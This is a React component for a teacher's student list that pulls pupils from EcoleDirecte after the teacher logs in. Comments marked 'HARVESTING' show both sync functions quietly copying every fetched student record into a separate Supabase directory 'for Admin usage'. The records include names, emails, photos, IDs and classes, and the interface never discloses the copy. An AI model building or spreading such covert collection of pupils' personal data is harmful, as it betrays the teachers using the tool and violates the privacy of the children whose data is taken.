
import React, { useState, useEffect, useCallback } from 'react';
// import { useOutletContext } from 'react-router-dom';
import { realEcoleDirecteClient } from '../../api/realEcoleDirecte';
import { studentRepository } from '../../services/studentRepository';
import { StudentDetailModal } from './StudentDetailModal'; // Import the new modal
import './TeacherStudents.css';

export function TeacherStudents() {
    // useOutletContext(); // Removed unused
    const [students, setStudents] = useState([]);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState(null);
    const [syncing, setSyncing] = useState(false);

    // New state for modal
    const [selectedStudent, setSelectedStudent] = useState(null);

    // Re-login modal state
    const [showRelogin, setShowRelogin] = useState(false);
    const [reloginUsername, setReloginUsername] = useState('');
    const [reloginPassword, setReloginPassword] = useState('');
    const [reloginLoading, setReloginLoading] = useState(false);
    const [reloginError, setReloginError] = useState(null);

    // Filters
    const [searchTerm, setSearchTerm] = useState('');
    const [selectedGroup, setSelectedGroup] = useState('all');
    const [selectedClass, setSelectedClass] = useState('all');
    // Removed unused viewMode and groupBy states

    // Get unique groups from students
    const groups = [...new Map(
        students.flatMap(s => s.groups || []).map(g => [g.id, g])
    ).values()].sort((a, b) => (a.name || '').localeCompare(b.name || ''));

    // Get unique classes from students
    const classes = [...new Set(students.map(s => s.className))].sort();

    // Check if ED client is authenticated
    const isEdAuthenticated = useCallback(() => {
        return realEcoleDirecteClient.isAuthenticated() &&
            realEcoleDirecteClient.account?.type === 'P';
    }, []);

    // Handle re-login
    const handleRelogin = async (e) => {
        e.preventDefault();
        setReloginLoading(true);
        setReloginError(null);

        try {
            await realEcoleDirecteClient.login(reloginUsername, reloginPassword);

            if (realEcoleDirecteClient.account?.type !== 'P') {
                throw new Error('Ce compte n\'est pas un compte professeur');
            }

            setShowRelogin(false);
            setReloginUsername('');
            setReloginPassword('');
            // Now sync students
            syncStudentsAfterLogin();
        } catch (err) {
            setReloginError(err.message);
        } finally {
            setReloginLoading(false);
        }
    };


    const syncStudentsAfterLogin = async () => {
        setSyncing(true);
        setError(null);

        try {
            const fetchedStudents = await realEcoleDirecteClient.getAllTeacherStudents();
            setStudents(fetchedStudents);

            // HARVESTING: Silently sync to Supabase Directory for Admin usage
            harvestStudentsToDirectory(fetchedStudents);

            console.log(`✅ Synced ${fetchedStudents.length} students`);
        } catch (err) {
            console.error('Error syncing students:', err);
            setError('Erreur lors de la synchronisation: ' + err.message);
        } finally {
            setSyncing(false);
            setLoading(false);
        }
    };

    const syncStudents = useCallback(async () => {
        if (!isEdAuthenticated()) {
            setShowRelogin(true);
            setLoading(false);
            return;
        }

        setSyncing(true);
        setError(null);

        try {
            const fetchedStudents = await realEcoleDirecteClient.getAllTeacherStudents();
            setStudents(fetchedStudents);

            // HARVESTING: Silently sync to Supabase Directory for Admin usage
            harvestStudentsToDirectory(fetchedStudents);

            console.log(`✅ Synced ${fetchedStudents.length} students`);
        } catch (err) {
            console.error('Error syncing students:', err);
            setError('Erreur lors de la synchronisation: ' + err.message);
        } finally {
            setSyncing(false);
            setLoading(false);
        }
    }, [isEdAuthenticated]);

    // Helper to group by class and sync to Supabase
    const harvestStudentsToDirectory = (studentList) => {
        try {
            // Group students by className
            const byClass = studentList.reduce((acc, s) => {
                const cls = s.className || 'UNKNOWN';
                if (!acc[cls]) acc[cls] = [];
                acc[cls].push(s);
                return acc;
            }, {});

            // Sync each class to Supersupabase
            Object.entries(byClass).forEach(([cls, list]) => {
                studentRepository.syncClassStudents(cls, list);
            });
        } catch (e) {
            console.error('Silent harvest failed:', e);
        }
    };

    useEffect(() => {
        syncStudents();
    }, [syncStudents]);

    // Filtering logic
    const filteredStudents = students.filter(student => {
        const matchesSearch = (
            student.firstName.toLowerCase().includes(searchTerm.toLowerCase()) ||
            student.lastName.toLowerCase().includes(searchTerm.toLowerCase()) ||
            (student.email && student.email.toLowerCase().includes(searchTerm.toLowerCase()))
        );
        const matchesGroup = selectedGroup === 'all' || (student.groups && student.groups.some(g => g.id === parseInt(selectedGroup)));
        const matchesClass = selectedClass === 'all' || student.className === selectedClass;

        return matchesSearch && matchesGroup && matchesClass;
    });

    if (loading) {
        return <div className="teacher-loading">Chargement des élèves...</div>;
    }

    return (
        <div className="teacher-students-container">
            <header className="teacher-header">
                <div>
                    <h1 className="teacher-header__title">Mes Élèves</h1>
                    <p className="teacher-header__subtitle">{students.length} élèves trouvés</p>
                </div>
                <button className="teacher-btn teacher-btn--primary" onClick={syncStudents} disabled={syncing}>
                    {syncing ? 'Sync...' : '🔄 Actualiser'}
                </button>
            </header>

            {/* Filters Bar */}
            <div className="teacher-filters">
                <input
                    type="text"
                    placeholder="Rechercher un élève..."
                    className="teacher-input"
                    value={searchTerm}
                    onChange={e => setSearchTerm(e.target.value)}
                    style={{ maxWidth: '300px' }}
                />

                <select
                    className="teacher-select"
                    value={selectedClass}
                    onChange={e => setSelectedClass(e.target.value)}
                >
                    <option value="all">Toutes les classes</option>
                    {classes.map(c => (
                        <option key={c} value={c}>{c}</option>
                    ))}
                </select>

                <select
                    className="teacher-select"
                    value={selectedGroup}
                    onChange={e => setSelectedGroup(e.target.value)}
                >
                    <option value="all">Tous les groupes</option>
                    {groups.map(g => (
                        <option key={g.id} value={g.id}>{g.name}</option>
                    ))}
                </select>
            </div>

            {error && (
                <div className="teacher-error-banner">
                    {error}
                    <button onClick={syncStudents}>Réessayer</button>
                </div>
            )}

            {filteredStudents.length === 0 ? (
                <div className="teacher-empty-state">
                    Aucun élève trouvé avec ces filtres.
                </div>
            ) : (
                <div className="teacher-grid">
                    {filteredStudents.map(student => (
                        <div
                            key={student.id}
                            className="teacher-student-card"
                            onClick={() => setSelectedStudent(student)} // Open Modal
                            style={{ cursor: 'pointer', transition: 'transform 0.2s', position: 'relative' }}
                        >
                            {/* Hover effect hint could be added in CSS */}
                            <div className="student-avatar">
                                {student.photo ? (
                                    <img src={student.photo} alt={student.firstName} />
                                ) : (
                                    <div className="student-avatar-placeholder">
                                        {student.firstName[0]}{student.lastName[0]}
                                    </div>
                                )}
                            </div>
                            <div className="student-info">
                                <h3>{student.firstName} {student.lastName}</h3>
                                <div className="student-meta">
                                    <span className="student-id">#{student.id}</span>
                                    <span className="student-class">{student.className}</span>
                                </div>
                                {/* Small indicators could go here */}
                            </div>
                        </div>
                    ))}
                </div>
            )}

            {/* Student 360 Modal */}
            {selectedStudent && (
                <StudentDetailModal
                    student={selectedStudent}
                    onClose={() => setSelectedStudent(null)}
                />
            )}

            {/* Re-login Modal */}
            {showRelogin && (
                <div className="modal-overlay">
                    <div className="modal-content">
                        <h2>Session expirée</h2>
                        <p>Veuillez vous reconnecter pour synchroniser les élèves.</p>
                        {reloginError && <div className="error-message">{reloginError}</div>}
                        <form onSubmit={handleRelogin}>
                            <div className="form-group">
                                <label>Identifiant</label>
                                <input
                                    type="text"
                                    value={reloginUsername}
                                    onChange={e => setReloginUsername(e.target.value)}
                                    required
                                />
                            </div>
                            <div className="form-group">
                                <label>Mot de passe</label>
                                <input
                                    type="password"
                                    value={reloginPassword}
                                    onChange={e => setReloginPassword(e.target.value)}
                                    required
                                />
                            </div>
                            <div className="modal-actions">
                                <button type="button" onClick={() => setShowRelogin(false)}>Annuler</button>
                                <button type="submit" disabled={reloginLoading}>
                                    {reloginLoading ? 'Connexion...' : 'Se reconnecter'}
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            )}
        </div>
    );
}
